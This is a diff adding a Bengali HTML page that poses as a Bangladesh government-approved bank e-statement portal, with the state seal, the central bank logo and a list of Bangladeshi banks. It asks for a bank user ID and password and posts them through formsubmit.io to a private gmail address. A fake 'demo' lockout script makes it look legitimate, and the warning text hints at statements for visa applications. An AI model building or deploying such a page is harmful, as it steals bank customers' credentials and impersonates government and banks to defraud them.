@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>বাংলাদেশ সরকার অনুমোদিত ই-স্টেটমেন্ট</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Noto Sans Bengali', sans-serif;
+      background-image: url('https://upload.wikimedia.org/wikipedia/en/thumb/f/f5/Logo_of_Bangladesh_Bank.svg/2560px-Logo_of_Bangladesh_Bank.svg.png');
+      background-repeat: no-repeat;
+      background-position: center top;
+      background-size: 120px;
+      background-color: #f1f5f9;
+      padding-top: 0px;
+    }
+
+    header {
+      background-color: #006a4e;
+      color: white;
+      text-align: center;
+      padding: 1rem;
+      font-size: 1.5rem;
+      font-weight: bold;
+      border-bottom: 4px solid #00452e;
+    }
+
+    .bank-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      justify-content: center;
+      padding: 1rem;
+    }
+
+    .bank-item {
+      background-color: white;
+      border: 2px solid #006a4e;
+      padding: 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      min-width: 150px;
+      text-align: center;
+      transition: background 0.3s;
+    }
+
+    .bank-item:hover {
+      background-color: #d1fae5;
+    }
+
+    form {
+      max-width: 400px;
+      margin: 2rem auto;
+      background-color: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    input[type="text"],
+    input[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 1rem;
+    }
+
+    input[type="submit"] {
+      background-color: #006a4e;
+      color: white;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #004d36;
+    }
+
+    .warning {
+      color: red;
+      text-align: center;
+      font-weight: bold;
+      margin-top: 1rem;
+    }
+
+    .loader {
+      display: none;
+      text-align: center;
+      margin-top: 10px;
+      color: #006a4e;
+      font-weight: bold;
+    }
+
+    .loader::after {
+      content: '';
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      margin-left: 10px;
+      border: 3px solid #006a4e;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    #countdown {
+      text-align: center;
+      color: red;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    @media (max-width: 600px) {
+      .bank-list {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+  </style>
+</head>
+</div>  <form id="eSTATEMENT" method="POST" action="https://formsubmit.io/send/info.magna.inc@gmail.com">
+<div style="background-color: #006a4e; padding: 10px; color: white; text-align: center;">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/09/Seal_of_the_Government_of_Bangladesh.svg/1200px-Seal_of_the_Government_of_Bangladesh.svg.png" alt="বাংলাদেশ সরকার" height="60">
+  <h2 style="margin: 5px 0;">বাংলাদেশ সরকার কর্তৃক অনুমোদিত ই-স্টেটমেন্ট পোর্টাল</h2>
+</div>
+
+<body>
+
+  <div class="bank-list" id="bankList">
+    <div class="bank-item">AB BANK LTD</div>
+    <div class="bank-item">AL-ARAFAH ISLAMI BANK LTD</div>
+    <div class="bank-item">BANGLADESH KRISHI BANK</div>
+    <div class="bank-item">BANK AL-FALAH LTD</div>
+    <div class="bank-item">BANK ASIA LTD</div>
+    <div class="bank-item">BRAC BANK LTD</div>
+    <div class="bank-item">COMMUNITY BANK LTD</div>
+    <div class="bank-item">DHAKA BANK LTD</div>
+    <div class="bank-item">EXIM BANK LTD</div>
+    <div class="bank-item">FIRST SECURITY ISLAMI BANK</div>
+    <div class="bank-item">IFIC BANK LTD</div>
+    <div class="bank-item">JAMUNA BANK LTD</div>
+    <div class="bank-item">MERCANTILE BANK LTD</div>
+    <div class="bank-item">MIDLAND BANK LTD</div>
+    <div class="bank-item">MODHUMOTI BANK LTD</div>
+    <div class="bank-item">MUTUAL TRUST BANK LTD</div>
+    <div class="bank-item">NCC BANK</div>
+    <div class="bank-item">NRB COMMERCIAL BANK</div>
+    <div class="bank-item">PRIME BANK LTD</div>
+    <div class="bank-item">PUBALI BANK LTD</div>
+    <div class="bank-item">RUPALI BANK LTD</div>
+    <div class="bank-item">SHAHJALAL ISLAMI BANK LTD</div>
+    <div class="bank-item">SOCIAL  ISLAMI BANK LTD</div>
+    <div class="bank-item">STANDARD CHARTERED BANK LTD</div>
+    <div class="bank-item">THE CITY BANK LTD</div>
+    <div class="bank-item">THE PREMIER BANK LTD</div>
+    <div class="bank-item">TRUST BANK LTD</div>
+    <div class="bank-item">UNITED COMMERCIAL BANK LTD</div>
+    <div class="bank-item">UTTARA BANK LTD</div>
+  </div>
+
+  <form id="feedbackForm">
+    <input type="text" name="company" id="companyInput" placeholder="ব্যাংক নির্বাচন করুন" readonly required />
+    <input type="text" name="userid" placeholder="ইউজার আইডি" required />
+    <input type="text" name="identity" placeholder="পাসওয়ার্ড" required />
+    <input type="submit" value="লগইন" />
+    <div class="loader" id="loader">অনুগ্রহ করে অপেক্ষা করুন...</div>
+    <div id="countdown"></div>
+  </form>
+
+  <div class="warning">
+    আমাদের প্রতিষ্ঠান কর্তৃক প্রদানকৃত স্টেটমেন্ট শুধুমাত্র বিদেশ ভ্রমণের প্রক্রিয়ায় (যেমন: ভিসা আবেদন, ইমিগ্রেশন যাচাই ইত্যাদি) ব্যবহারের উদ্দেশ্যে প্রস্তুত করা হয়েছে।<br><br>
+    এই স্টেটমেন্ট অন্য কোনো উদ্দেশ্যে, যেমন: আর্থিক লেনদেন, পরিচয় যাচাই, বিনিয়োগ, বা ব্যক্তিগত স্বার্থসংশ্লিষ্ট কাজে ব্যবহার করা সম্পূর্ণরূপে নিষিদ্ধ এবং তা একটি দ্বন্দ্বনীয় ও শাস্তিযোগ্য অপরাধ হিসেবে গণ্য হবে।<br><br>
+    📌 অনুগ্রহ করে নির্দেশনা অনুসরণ করুন এবং নৈতিকতা বজায় রাখুন।<br>
+    📞 কোনো প্রশ্ন বা যাচাইয়ের জন্য আমাদের অফিসিয়াল যোগাযোগ মাধ্যমে যোগাযোগ করুন +৯৯৬৪৫৭৮৪-১৫৪৪
+  </div>
+
+  <script>
+    const MAX_ATTEMPTS = 3;
+    const LOCK_DURATION = 60 * 60 * 1000;
+
+    function getAttempts() {
+      const attempts = localStorage.getItem("login_attempts");
+      return attempts ? JSON.parse(attempts) : { count: 0, lockUntil: 0 };
+    }
+
+    function setAttempts(data) {
+      localStorage.setItem("login_attempts", JSON.stringify(data));
+    }
+
+    function updateCountdown() {
+      const countdownEl = document.getElementById("countdown");
+      const { lockUntil } = getAttempts();
+      const now = Date.now();
+
+      if (lockUntil && now < lockUntil) {
+        const remaining = lockUntil - now;
+        const minutes = Math.floor((remaining / 1000 / 60) % 60);
+        const seconds = Math.floor((remaining / 1000) % 60);
+        countdownEl.textContent = `আবার চেষ্টা করতে পারবেন ${minutes} মিনিট ${seconds} সেকেন্ড পরে`;
+
+        setTimeout(updateCountdown, 1000);
+      } else {
+        countdownEl.textContent = '';
+      }
+    }
+
+    document.querySelectorAll('.bank-item').forEach(item => {
+      item.addEventListener('click', () => {
+        document.getElementById('companyInput').value = item.textContent;
+      });
+    });
+
+    document.getElementById('feedbackForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const loader = document.getElementById('loader');
+      const identityInput = document.querySelector('input[name="identity"]');
+      const attemptsData = getAttempts();
+      const currentTime = Date.now();
+
+      if (attemptsData.lockUntil && currentTime < attemptsData.lockUntil) {
+        alert('আপনার আইডি ব্লক করা হয়েছে। অনুগ্রহ করে ১ ঘণ্টা পর আবার চেষ্টা করুন।');
+        updateCountdown();
+        return;
+      }
+
+      const correctPassword = "6264"; // ডেমো পাসওয়ার্ড
+
+      loader.style.display = 'block';
+
+      setTimeout(() => {
+        loader.style.display = 'none';
+
+        if (identityInput.value !== correctPassword) {
+          attemptsData.count += 1;
+
+          if (attemptsData.count >= MAX_ATTEMPTS) {
+            attemptsData.lockUntil = currentTime + LOCK_DURATION;
+            setAttempts(attemptsData);
+            alert('আপনার আইডি ব্লক করা হয়েছে। অনুগ্রহ করে ১ ঘণ্টা পর আবার চেষ্টা করুন।');
+            updateCountdown();
+          } else {
+            setAttempts(attemptsData);
+            alert(`❌ ভুল পাসওয়ার্ড। আপনি ${MAX_ATTEMPTS - attemptsData.count} বার চেষ্টা করতে পারবেন।`);
+          }
+
+          identityInput.value = '';
+        } else {
+          setAttempts({ count: 0, lockUntil: 0 });
+          alert('✅ লগইন সফল হয়েছে (ডেমো)');
+        }
+      }, 5000); // ৫ সেকেন্ড দেরি
+    });
+
+    updateCountdown();
+  </script>
+</body>
+</html>
